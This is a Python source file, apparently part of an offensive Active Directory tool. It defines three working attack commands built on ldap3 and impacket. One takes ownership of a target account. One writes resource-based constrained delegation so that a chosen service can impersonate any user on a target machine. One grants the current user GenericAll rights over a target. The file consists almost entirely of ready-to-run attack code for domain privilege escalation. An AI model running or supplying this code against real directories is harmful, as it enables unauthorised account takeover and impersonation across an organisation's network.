import time
import ssl
import os
from ldap3 import Server, ALL, Connection, NTLM, SUBTREE, Tls, MODIFY_ADD, MODIFY_REPLACE, SASL, KERBEROS
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK
from rich import print
import readline
import rlcompleter
import atexit
import heapq
import shlex

def cmd_setowner(conn, base_dn, target_user, sess_user):
    print(f"[*] Attempting to set owner of '{target_user}' to '{sess_user}'")

    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
        return
    owner_sid_raw = conn.entries[0]['objectSid'].raw_values[0]

    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
        return
    target_dn = conn.entries[0].distinguishedName.value

    from ldap3.protocol.microsoft import security_descriptor_control
    ctrls = security_descriptor_control(sdflags=0x01)

    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)

    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions![/bold red]")
        return

    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]

    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(current_sd_raw)
    sd['OwnerSid'] = LDAP_SID(owner_sid_raw)
    new_sd_raw = sd.getData()
    
    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}
    
    conn.modify(target_dn, changes, controls=ctrls)

    if conn.result["result"] == 0:
        print(f"[bold green][+] Successfully took ownership of '{target_user}'[/bold green]")
    else:
        print(f"[bold red][-] Failed to change owner: {conn.result['description']}[/bold red]")
def cmd_addrbcd(conn, base_dn, target, service):
    """Add Resource-Based Constrained Delegation (RBCD) on 'target' for 'service'.

    After this, 'service' can impersonate any user on 'target' via S4U2Proxy.
    Requires WriteProperty/GenericWrite on target's msDS-AllowedToActOnBehalfOfOtherIdentity.
    """
    print(f"[*] Adding RBCD: {service} -> {target} (service can now impersonate users on {target} via S4U2Proxy)")

    # Resolve target DN (accept sAMAccountName, DN or SID)
    target_dn = None
    if target.startswith("CN="):
        target_dn = target
    elif target.startswith("S-1-"):
        conn.search(base_dn, f"(objectSid={target})", attributes=["distinguishedName"])
        if not conn.entries:
            print(f"[bold red][-] Could not resolve target DN for SID {target}[/bold red]")
            return
        target_dn = str(conn.entries[0].distinguishedName)
    else:
        conn.search(base_dn, f"(sAMAccountName={target})", attributes=["distinguishedName"])
        if not conn.entries:
            print(f"[bold red][-] Could not resolve target '{target}'[/bold red]")
            return
        target_dn = str(conn.entries[0].distinguishedName)

    # Resolve service's objectSid (accept sAMAccountName, DN or SID)
    service_sid = None
    if service.startswith("S-1-"):
        sid_obj = LDAP_SID()
        sid_obj.fromCanonical(service)
        service_sid = sid_obj.getData()
    else:
        conn_filter = f"(distinguishedName={service})" if service.startswith("CN=") else f"(sAMAccountName={service})"
        conn.search(base_dn, conn_filter, attributes=["objectSid", "distinguishedName"])
        if not conn.entries:
            print(f"[bold red][-] Could not resolve SID for service '{service}'[/bold red]")
            return
        service_sid = conn.entries[0].objectSid.raw_values[0]

    # Read target's msDS-AllowedToActOnBehalfOfOtherIdentity security descriptor
    from ldap3.protocol.microsoft import security_descriptor_control
    ctrls = security_descriptor_control(sdflags=0x04)

    conn.search(target_dn, '(objectClass=*)', search_scope='BASE',
                attributes=['msDS-AllowedToActOnBehalfOfOtherIdentity'], controls=ctrls)

    if not conn.entries or 'msDS-AllowedToActOnBehalfOfOtherIdentity' not in conn.entries[0]:
        print(f"[bold yellow][!] msDS-AllowedToActOnBehalfOfOtherIdentity not set on target. Creating new SD...[/bold yellow]")
        current_sd_raw = None
    else:
        raw_vals = conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
        current_sd_raw = raw_vals[0] if raw_vals else None

    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK, ACL
    sd = SR_SECURITY_DESCRIPTOR()
    fresh = False
    if current_sd_raw:
        sd.fromString(current_sd_raw)
    else:
        fresh = True
        # Build a fresh SD with just our ACE in the DACL
        sd['Revision'] = b'\x01'
        sd['Sbz1'] = b'\x00'
        sd['Control'] = 0x0004  # SE_DACL_PRESENT
        # Create ACE
        nace = ACE()
        nace['AceType'] = 0x00
        nace['AceFlags'] = 0x00
        acedata = ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ACCESS_MASK()
        acedata['Mask']['Mask'] = 0x00010000
        acedata['Sid'] = LDAP_SID(service_sid)
        nace['Ace'] = acedata

        # Build DACL ACL object
        acl = ACL()
        acl['AclRevision'] = 2
        acl['Sbz1'] = 0
        acl['Sbz2'] = 0
        acl.aces = [nace]
        sd['Dacl'] = acl

        # Null owner/group SIDs
        null_sid = LDAP_SID()
        null_sid.fromCanonical('S-1-0-0')
        sd['Sacl'] = b''
        sd['OwnerSid'] = null_sid
        sd['GroupSid'] = null_sid

    if not fresh:
        # ACE granting ADS_RIGHT_DS_CONTROL_ACCESS (0x00010000) to service SID
        nace = ACE()
        nace['AceType'] = 0x00  # ACCESS_ALLOWED_ACE_TYPE
        nace['AceFlags'] = 0x00

        acedata = ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ACCESS_MASK()
        acedata['Mask']['Mask'] = 0x00010000  # ADS_RIGHT_DS_CONTROL_ACCESS
        acedata['Sid'] = LDAP_SID(service_sid)

        nace['Ace'] = acedata
        sd['Dacl'].aces.append(nace)
    new_sd_raw = sd.getData()

    # Use MODIFY_ADD if attribute doesn't exist yet, MODIFY_REPLACE otherwise
    mod_op = MODIFY_ADD if fresh else MODIFY_REPLACE
    changes = {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(mod_op, [new_sd_raw])]}

    # Write without SD control - the attribute value IS the raw SD
    conn.modify(target_dn, changes)

    if conn.result["result"] == 0:
        print(f"[bold green][+] RBCD set: {service} can now impersonate users on {target} via S4U2Proxy[/bold green]")
    else:
        print(f"[bold red][-] Failed to set RBCD: {conn.result['description']}[/bold red]")


def cmd_genericall(conn, base_dn, target_user, sess_user):
    print(f"[*] Attempting to grant GenericAll on '{target_user}' to '{sess_user}'")

    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
        return
    session_sid_raw = conn.entries[0]['objectSid'].raw_values[0]

    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
        return
    target_dn = conn.entries[0].distinguishedName.value

    from ldap3.protocol.microsoft import security_descriptor_control
    ctrls = security_descriptor_control(sdflags=0x04)

    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)

    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions! [/bold red]")
        return

    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]

    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK
    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(current_sd_raw)

    nace = ACE()
    nace['AceType'] = 0x00
    nace['AceFlags'] = 0x00

    acedata = ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551
    acedata['Sid'] = LDAP_SID(session_sid_raw)

    nace['Ace'] = acedata

    sd['Dacl'].aces.append(nace)
    new_sd_raw = sd.getData()

    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}

    conn.modify(target_dn, changes, controls=ctrls)

    if conn.result["result"] == 0:
        print(f"[bold green][+] Successfully granted GenericAll on '{target_user}' to '{sess_user}'[/bold green]")

    else:
        print(f"[bold red][-] Failed to grant GenericAll: {conn.result['description']}[/bold red]")

